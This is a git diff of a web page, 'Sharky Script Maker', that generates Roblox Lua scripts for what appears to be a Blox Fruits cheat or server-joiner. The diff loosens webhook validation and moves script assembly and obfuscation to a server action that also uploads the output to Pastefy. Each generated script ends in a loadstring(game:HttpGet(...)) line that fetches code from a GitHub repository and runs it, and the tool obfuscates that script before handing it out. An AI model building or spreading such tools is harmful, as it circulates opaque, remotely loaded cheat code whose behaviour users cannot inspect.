@@ -7,9 +7,9 @@ import {Checkbox} from '@/components/ui/checkbox';
 import {Label} from '@/components/ui/label';
 import {Input} from '@/components/ui/input';
 import {Download, Copy, HelpCircle} from 'lucide-react';
-import {useToast} from '@/hooks/use-toast'; // Assuming this is your custom hook path
+import {useToast} from '@/hooks/use-toast';
 
-import {obfuscateScript} from '@/ai/flows/obfuscate-script';
+import {obfuscateScript, ObfuscateScriptInput} from '@/ai/flows/obfuscate-script';
 import ParticleComponent from '@/components/ParticleComponent';
 
 import {
@@ -18,9 +18,9 @@ import {
   TooltipProvider,
   TooltipTrigger,
 } from "@/components/ui/tooltip"
-import {useIsMobile} from "@/hooks/use-mobile"; // Assuming this is your custom hook path
+import {useIsMobile} from "@/hooks/use-mobile";
 
-// --- Constants for Fruits ---
+// --- Constants ---
 const mythicalFruits = [
   'Kitsune-Kitsune', 'Yeti-Yeti', 'Gas-Gas', 'Leopard-Leopard', 'Control-Control',
   'Dough-Dough', 'T-Rex-T-Rex', 'Spirit-Spirit', 'Mammoth-Mammoth', 'Venom-Venom',
@@ -33,21 +33,21 @@ const legendaryFruits = [
 const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];
 const defaultSelectedFruits = ['Kitsune-Kitsune', 'Leopard-Leopard', 'Yeti-Yeti', 'Gas-Gas'];
 
-// --- Define the expected URL prefix ---
-const PROTECTED_WEBHOOK_PREFIX = 'https://sharky-on-top.script-config-protector.workers.dev/w/';
-const PROTECTOR_URL = 'https://sharkyontop.pages.dev/'; // Define protector URL constant
+// --- Validation Patterns ---
+// Combined Regex to accept standard Discord webhooks OR the protected format
+const VALID_WEBHOOK_REGEX = /^(https:\/\/discord(app)?\.com\/api\/webhooks\/(\d+)\/([a-zA-Z0-9_-]+)|https:\/\/sharky-on-top\.script-config-protector\.workers\.dev\/w\/[a-zA-Z0-9-]+)$/;
+const PROTECTED_WEBHOOK_PREFIX = 'https://sharky-on-top.script-config-protector.workers.dev/w/'; // Keep for backend check reference if needed
 
+// --- Base loadstring part of the script ---
+const BASE_LOADSTRING = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()';
 
-// --- Type for error state to optionally include a link flag ---
-type WebhookErrorState = {
-    message: string;
-    showLink?: boolean;
-} | null;
+// --- Error State Type ---
+type WebhookErrorState = string | null;
 
 
 export default function Home() {
   // --- State Variables ---
-  const [webhookUrl, setWebhookUrl] = useState('');
+  const [webhookUrl, setWebhookUrl] = useState(''); // Accepts raw OR protected
   const [usernames, setUsernames] = useState('');
   const [selectedFruits, setSelectedFruits] = useState<string[]>(defaultSelectedFruits);
   const [configuredScript, setConfiguredScript] = useState('');
@@ -77,27 +77,28 @@ export default function Home() {
 
   const isGenerating = isPending;
 
-  // --- Generate Script Logic (remains the same) ---
+  // --- Generate Script Logic (MODIFIED) ---
   const generateScript = async () => {
     setWebhookError(null);
     setConfiguredScript('');
     setObfuscatedScript('');
     setPastefyLink('');
 
+    // --- ** UPDATED: Validate Webhook URL (Accepts Raw OR Protected) ** ---
     if (!webhookUrl) {
-        setWebhookError({ message: 'Protected WebhookURL is required.'});
-        toast({ title: 'Error', description: 'Protected WebhookURL is required.', variant: 'destructive' });
+        setWebhookError('Webhook URL is required.');
+        toast({ title: 'Error', description: 'Webhook URL is required.', variant: 'destructive' });
         return;
     }
-    if (!webhookUrl.startsWith(PROTECTED_WEBHOOK_PREFIX)) {
-        setWebhookError({
-            message: 'Protected Webhook Required. Protect your discord webhook here:',
-            showLink: true
-        });
-        toast({ title: 'Error', description: `Invalid Webhook URL format.`, variant: 'destructive' });
+    // Validate against the combined regex
+    if (!VALID_WEBHOOK_REGEX.test(webhookUrl)) {
+        setWebhookError('Invalid format. Use a standard Discord webhook or your protected Sharky URL.');
+        toast({ title: 'Error', description: 'Invalid Webhook URL format.', variant: 'destructive' });
         return;
     }
+    // --- End Validation ---
 
+    // Basic input checks
     if (!usernames.trim()) {
         toast({ title: 'Error', description: 'Usernames cannot be empty.', variant: 'destructive' });
         return;
@@ -107,15 +108,18 @@ export default function Home() {
         return;
     }
 
+    // --- Prepare Data for Server Action ---
+    let formattedUsernames = '';
+    let formattedFruits = '';
     try {
-      const formattedUsernames = usernames
+      formattedUsernames = usernames
         .split('\n')
         .map(user => user.trim())
         .filter(user => user.length > 0)
         .map(user => `"${user}"`)
         .join(', ');
 
-      const formattedFruits = selectedFruits
+      formattedFruits = selectedFruits
         .map(fruit => `"${fruit}"`)
         .join(', ');
 
@@ -124,24 +128,34 @@ export default function Home() {
           return;
       }
 
-      let script = `Webhook = "${webhookUrl}" -- << Protected Webhook Here\n`;
-      script += `Usernames = {${formattedUsernames}} -- << Your usernames here, you can add as many alts as you want\n`;
-      script += `FruitsToHit = {${formattedFruits}} -- << Fruits you want the script to detect\n`;
-      script += `loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;
+      // Display Example Configured Script Structure (Optional)
+      const exampleConfigured = `Webhook = "[Your Final Webhook URL]"\n` + // Updated placeholder
+                                `Usernames = {${formattedUsernames}}\n` +
+                                `FruitsToHit = {${formattedFruits}}\n` +
+                                `${BASE_LOADSTRING}`;
+      setConfiguredScript(exampleConfigured);
 
-      setConfiguredScript(script);
 
+      // --- Prepare input for the Server Action (Pass the potentially raw OR protected URL) ---
+      const serverActionInput = {
+          webhookUrl: webhookUrl, // Pass the URL as entered by the user
+          usernamesLuaTable: `{${formattedUsernames}}`,
+          fruitsLuaTable: `{${formattedFruits}}`,
+          baseLoadstring: BASE_LOADSTRING
+      };
+
+      // --- Call the Server Action ---
       startTransition(async () => {
         try {
-          const obfuscationResult = await obfuscateScript({script: script});
-          setObfuscatedScript(obfuscationResult.obfuscatedScript);
-          setPastefyLink(obfuscationResult.pastefyLink);
+          const result = await obfuscateScript(serverActionInput); // Backend now handles protection if needed
+          setObfuscatedScript(result.obfuscatedScript);
+          setPastefyLink(result.pastefyLink);
           toast({
             title: 'Script Generated!',
-            description: 'Script generated and obfuscated successfully.',
+            description: 'Webhook processed and script obfuscated successfully.', // Updated message
           });
         } catch (error: any) {
-          console.error("Error during obfuscation:", error);
+          console.error("Error during script generation:", error);
           toast({
             title: 'Error',
             description: `Failed to generate script: ${error.message}`,
@@ -149,80 +163,41 @@ export default function Home() {
           });
           setObfuscatedScript('');
           setPastefyLink('');
+          setConfiguredScript('');
         }
       });
     } catch (error: any) {
-       console.error("Error constructing script:", error);
+       console.error("Error formatting inputs:", error);
        toast({
         title: 'Error',
-        description: `Failed to construct script: ${error.message}`,
+        description: `Failed to process inputs: ${error.message}`,
         variant: 'destructive',
       });
     }
   };
 
-  // --- Fruit Selection Logic (remains the same) ---
-  const handleFruitSelect = (fruit: string) => {
-    setSelectedFruits(prev => {
-      if (prev.includes(fruit)) {
-        return prev.filter(f => f !== fruit);
-      } else {
-        return [...prev, fruit];
-      }
-    });
-  };
+  // --- Other Handlers (handleFruitSelect, downloadScript, copyToClipboard - remain the same) ---
+  const handleFruitSelect = (fruit: string) => { setSelectedFruits(prev => prev.includes(fruit) ? prev.filter(f => f !== fruit) : [...prev, fruit]); };
+  const downloadScript = () => { /* ... download logic ... */ if (!obfuscatedScript) { toast({ title: 'Error', description: 'Please generate a script first.', variant: 'destructive' }); return; } const blob = new Blob([obfuscatedScript], {type: 'text/plain'}); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'roblox_script.lua'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url); };
+  const copyToClipboard = async (textToCopy: string, successMessage: string) => { if (!textToCopy) { toast({ title: 'Error', description: 'Nothing to copy.', variant: 'destructive' }); return; } try { await navigator.clipboard.writeText(textToCopy); toast({ title: 'Copied!', description: successMessage }); } catch (err) { console.error('Failed to copy text: ', err); toast({ variant: "destructive", title: "Copy Failed", description: "Could not copy script." }); } };
 
-  // --- Download Logic (remains the same) ---
-  const downloadScript = () => {
-    if (!obfuscatedScript) {
-      toast({ title: 'Error', description: 'Please generate a script first.', variant: 'destructive' });
-      return;
-    }
-    const blob = new Blob([obfuscatedScript], {type: 'text/plain'});
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = 'roblox_script.lua';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(url);
-  };
-
-  // --- Copy Logic (remains the same) ---
-  const copyToClipboard = async (textToCopy: string, successMessage: string) => {
-     if (!textToCopy) {
-       toast({ title: 'Error', description: 'Nothing to copy.', variant: 'destructive' });
-       return;
-     }
-     try {
-        await navigator.clipboard.writeText(textToCopy);
-        toast({ title: 'Copied!', description: successMessage });
-     } catch (err) {
-        console.error('Failed to copy text: ', err);
-        toast({ variant: "destructive", title: "Copy Failed", description: "Could not copy script." });
-     }
-  };
 
   // --- JSX Return ---
   return (
     <>
       <ParticleComponent />
-      {/* Base text color set here */}
       <div className="flex flex-col items-center justify-center min-h-screen p-4 text-gray-100">
-        {/* Container with background and base text color */}
         <div className="container mx-auto max-w-3xl w-full bg-gray-800 bg-opacity-80 p-8 rounded-lg border border-cyan-500/30 shadow-lg shadow-cyan-500/20 z-10 text-gray-100">
 
-          {/* Apply the custom neon glow class to the main title */}
           <h1 className="text-3xl font-bold mb-8 text-center text-neon-blue-glow">
             Sharky Script Maker
           </h1>
 
-          {/* Webhook Section */}
+          {/* Webhook Section (Label and Tooltip Updated) */}
           <div className="mb-4">
              <div className="flex items-center space-x-2 mb-2">
-                {/* Label: Use a standard highlight color, not the full glow */}
-                <Label htmlFor="webhookUrl" className="text-cyan-400 font-bold">Protected WebhookURL</Label>
+                {/* Updated Label */}
+                <Label htmlFor="webhookUrl" className="text-cyan-400 font-bold">Discord Webhook URL</Label>
                 <TooltipProvider>
                   <Tooltip
                     open={tooltipStates.webhookUrl}
@@ -233,20 +208,16 @@ export default function Home() {
                         <HelpCircle className="h-4 w-4 text-gray-400" />
                       </Button>
                     </TooltipTrigger>
-                    {/* Tooltip Content: Use standard text colors */}
+                    {/* === Updated Tooltip Content === */}
                     <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
-                        <p className="mb-2">Enter your <b>Protected Webhook URL</b> to receive notifications when the script detects a fruit.</p>
-                        <p className="mb-2">First make a Discord Webhook, and then protect it here --&gt;{' '}
-                            <a href={PROTECTOR_URL} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
-                                {PROTECTOR_URL}
-                            </a>.
-                        </p>
-                        <p>This allows the script to send messages to your Discord channel.</p>
+                        <p className="mb-2">Enter your <b>standard Discord Webhook URL</b> OR your existing <b>Protected Sharky URL</b>.</p>
+                        <p className="mb-2">Standard Discord URLs will be automatically protected.</p>
+                        <p>This allows the script to send messages securely to your Discord channel.</p>
                     </TooltipContent>
+                     {/* === End Updated Tooltip Content === */}
                   </Tooltip>
                 </TooltipProvider>
               </div>
-              {/* Input: Standard text color */}
               <Input
                 type="text"
                 id="webhookUrl"
@@ -255,31 +226,20 @@ export default function Home() {
                     setWebhookUrl(e.target.value);
                     if (webhookError) setWebhookError(null);
                 }}
-                placeholder="Enter your protected webhook URL"
+                placeholder="Enter standard Discord or Protected Sharky URL" // Updated placeholder
+                // Updated className for error state
                 className={`w-full p-3 bg-gray-900 border rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent ${webhookError ? 'border-red-500' : 'border-cyan-500/50'}`}
               />
-              {/* Error Display: Standard error/link colors */}
+              {/* Updated Error Display */}
               {webhookError && (
-                <div className="mt-1">
-                  <p className="text-sm text-red-400">{webhookError.message}</p>
-                  {webhookError.showLink && (
-                    <a
-                      href={PROTECTOR_URL}
-                      target="_blank"
-                      rel="noopener noreferrer"
-                      className="text-sm text-blue-400 hover:underline"
-                    >
-                      {PROTECTOR_URL}
-                    </a>
-                  )}
-                </div>
+                  <p className="mt-1 text-sm text-red-400">{webhookError}</p>
               )}
           </div>
 
-          {/* Usernames Section */}
+          {/* Usernames Section (remains the same) */}
           <div className="mb-4">
-              <div className="flex items-center space-x-2 mb-2">
-                {/* Label: Standard highlight color */}
+              {/* ... (Label and Tooltip) ... */}
+               <div className="flex items-center space-x-2 mb-2">
                 <Label htmlFor="usernames" className="text-cyan-400 font-bold">Usernames (one per line)</Label>
                   <TooltipProvider>
                      <Tooltip
@@ -302,7 +262,6 @@ export default function Home() {
                     </Tooltip>
                   </TooltipProvider>
               </div>
-              {/* Textarea: Standard text color */}
               <Textarea
                 id="usernames"
                 value={usernames}
@@ -313,13 +272,13 @@ export default function Home() {
               />
           </div>
 
-          {/* Fruits Section */}
+          {/* Fruits Section (remains the same) */}
           <div className="mb-4">
-              <div className="flex items-center space-x-2 mb-2">
-                 {/* Label: Standard highlight color */}
+               {/* ... (Label and Tooltip) ... */}
+               <div className="flex items-center space-x-2 mb-2">
                 <Label className="text-cyan-400 font-bold">Fruits to Hit</Label>
                  <TooltipProvider>
-                     <Tooltip
+                    <Tooltip
                       open={tooltipStates.fruitsToHit}
                       onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, fruitsToHit: open })}
                     >
@@ -337,9 +296,9 @@ export default function Home() {
                     </Tooltip>
                   </TooltipProvider>
               </div>
-              {/* Checkbox Area: Standard text color for labels */}
               <div className="grid grid-cols-2 md:grid-cols-4 gap-2 p-3 bg-gray-900 border border-cyan-500/50 rounded-md">
-                {sortedFruitsByRarity.map(fruit => (
+                {/* ... (Checkbox mapping remains the same) ... */}
+                 {sortedFruitsByRarity.map(fruit => (
                   <div key={fruit} className="flex items-center space-x-2">
                    <Checkbox
                       id={fruit}
@@ -349,7 +308,7 @@ export default function Home() {
                     />
                     <label
                       htmlFor={fruit}
-                      className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer text-gray-100" // Standard text
+                      className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer text-gray-100"
                     >
                       {fruit}
                     </label>
@@ -365,21 +324,19 @@ export default function Home() {
             </Button>
           </div>
 
-          {/* Configured Script Output */}
+          {/* Configured Script Output (Now shows example structure) */}
           {configuredScript && (
             <div className="mb-4">
               <div className="flex justify-between items-center mb-2">
-                 {/* Label: Keep highlight color */}
-                 <Label className="text-green-400 font-bold">Configured Script</Label>
+                 <Label className="text-green-400 font-bold">Example Configured Script Structure</Label>
                  <Button
-                    onClick={() => copyToClipboard(configuredScript, 'Configured script copied.')}
+                    onClick={() => copyToClipboard(configuredScript, 'Example structure copied.')}
                     variant="outline" size="sm"
                     className="bg-gray-600 hover:bg-gray-500 text-gray-100 border-gray-500 px-2 py-1"
                     >
                     <Copy className="h-3 w-3 mr-1" /> Copy
                  </Button>
               </div>
-              {/* Textarea: Standard text color */}
               <Textarea
                 value={configuredScript} readOnly
                 className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90"
@@ -388,11 +345,11 @@ export default function Home() {
             </div>
           )}
 
-          {/* Obfuscated Script Output */}
+          {/* Obfuscated Script Output (remains the same) */}
           {obfuscatedScript && (
             <div className="mb-4">
-               <div className="flex justify-between items-center mb-2">
-                  {/* Label: Keep highlight color */}
+               {/* ... (Label, Copy Button, Pastefy Link) ... */}
+                <div className="flex justify-between items-center mb-2">
                  <Label className="text-green-400 font-bold">Obfuscated Script</Label>
                  <Button
                     onClick={() => copyToClipboard(obfuscatedScript, 'Obfuscated script copied.')}
@@ -404,14 +361,12 @@ export default function Home() {
               </div>
               {pastefyLink && (
                 <div className="mb-2 text-sm">
-                  {/* Link: Keep highlight color */}
                   <span className="text-gray-400">Pastefy Link: </span>
                   <a href={pastefyLink} target="_blank" rel="noopener noreferrer" className="text-cyan-400 hover:underline break-all">
                     {pastefyLink}
                   </a>
                 </div>
               )}
-              {/* Textarea: Standard text color */}
               <Textarea
                 value={obfuscatedScript} readOnly
                 className="w-full p-3 bg-gray-900 border border-green-500/30 rounded-md text-gray-100 opacity-90"
@@ -420,7 +375,7 @@ export default function Home() {
             </div>
           )}
 
-          {/* Download Button: Keep highlight color */}
+          {/* Download Button (remains the same) */}
            <Button
               onClick={downloadScript}
               className="w-full mt-4 p-4 border border-cyan-500/50 text-cyan-400 bg-gray-800 hover:bg-gray-700 rounded-md disabled:opacity-50 disabled:cursor-not-allowed"
